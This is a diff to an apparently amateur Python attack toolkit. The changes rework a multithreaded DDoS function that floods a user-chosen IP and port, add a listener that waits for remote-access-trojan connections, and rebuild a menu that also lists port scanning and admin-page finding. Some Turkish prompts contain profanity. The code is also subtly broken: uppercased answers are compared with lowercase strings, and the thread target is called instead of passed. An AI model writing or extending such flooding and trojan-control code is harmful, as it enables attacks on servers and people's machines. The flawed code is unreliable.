@@ -12,15 +12,6 @@ class Color:
     YELLOW = "\033[1;33m"
     CYAN = "\033[0;36m"
 
-def nain():
-    ip = input("IP: ")
-    port = int(input("Port: "))
-    try:
-        addr = (ip, port)
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        server.connect(addr)
-    except socket.error as e:
-        print(f"Error {e}")
 def github():
     webbrowser.open("https://github.com/LordSUCCSES")
 
@@ -68,10 +59,13 @@ def open():
     window.mainloop()
 
 def myip():
-    hostname = socket.gethostname()
-    ip = socket.gethostbyname(hostname)
-    sleep(5)
-    print("Your IP: " + ip)
+    try:
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+        sleep(5)
+        print("Your IP: " + ip)
+    except ValueError:
+        print("Error!")
 
 def myport():
     host = socket.gethostname()
@@ -152,44 +146,93 @@ class ddosattack():
                 anum += 1
                 print(anum)
             except socket.error as e:
-                print("Hata")
+                print("Error!")
 
 
 def startddos():
-    ip = input("Enter IP: ")
-    port = int(input("Enter Port: "))
-    thread = int(input("Enter Threading: "))
-    for i in range(thread):
-        t = threading.Thread(target=ddosattack.ddos(ip, port))
-        t.start()
-        print(i)
+    try:
+        ip = input("Enter IP: ")
+        port = int(input("Enter Port: "))
+        thread = int(input("Enter Threading: "))
 
-print("1: Find Web IP\n2: Scan Web Port\n3: Web Server Send To Data\n4: My IP\n5: My Find Port\n6: My Computer Name\n7: Custom Port Scan\n8: Admin Page Finding\n10: DDoS Attack\n10: Who Are We")
+        for i in range(thread):
+            t = threading.Thread(target=ddosattack.ddos(ip, port))
+            t.start()
+            print("The program has been launched successfully!")
 
-i = int(input("Enter Command: "))
+        return ip, port, thread, t
 
-if i == 1:
-    findip()
-elif i == 2:
-    scan_port()
-elif i == 3:
-    send_data()
-elif i == 4:
-    myip()
-elif i == 5:
-    myport()
-elif i == 6:
-    pcname()
-elif i == 7:
-    customscan()
-elif i == 8:
-    adminfind()
-elif i == 9:
-    startddos()
-elif i == 10:
-    open()
-else:
-    print("Enter a Valid Number")
+    except ValueError:
+        print("Error!")
+        startddos()
 
+def rat_listen():
+    try:
+        host = socket.gethostname()
+        ip = socket.gethostbyname(host)
+        port = 24
 
-nain()
+        i = str(input(f"IP'niz {ip} budur kullanmak istiyor musunuz? (evet/hayır): ")).upper()
+        if i == "evet":
+            pass
+        elif i == "hayır":
+            ip = input("İstediğiniz IP giriniz: ")
+        else:
+            print("Ya bi siktir git")
+            exit()
+
+        p = str(input(f"Varsayılan port'unuz {port} budur kullanmak istiyor musunuz? (evet/hayır): ")).upper()
+
+        if p == "evet":
+            pass
+        elif p ==  "hayır":
+            port = int(input("İstediğiniz portu giriniz: "))
+        else:
+            print("Ya siktir git lan")
+            exit()
+
+        ADDR = (ip, port)
+        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.bind(ADDR)
+        server.listen(1)
+        print(f"Bu {ip} IP Dinlemeye Alındı")
+
+        while True:
+            client, addr=server.accept()
+            print(f"Girdi: {addr}")
+    except ValueError:
+        print("Error!")
+        rat_listen()
+
+def choice():
+    try:
+        print("1: Find Web IP\n2: Scan Web Port\n3: Web Server Send To Data\n4: My IP\n5: My Find Port\n6: My Computer Name\n7: Custom Port Scan\n8: Admin Page Finding\n9: DDoS Attack\n10: Listen To RAT\n11: Who Are We")
+        i = int(input("Enter Command: "))
+        if i == 1:
+            findip()
+        elif i == 2:
+            scan_port()
+        elif i == 3:
+            send_data()
+        elif i == 4:
+            myip()
+        elif i == 5:
+            myport()
+        elif i == 6:
+            pcname()
+        elif i == 7:
+            customscan()
+        elif i == 8:
+            adminfind()
+        elif i == 9:
+            startddos()
+        elif i == 10:
+            rat_listen()
+        elif i == 11:
+            open()
+
+        return i
+    except:
+        print("Enter a Valid Number")
+
+choice()
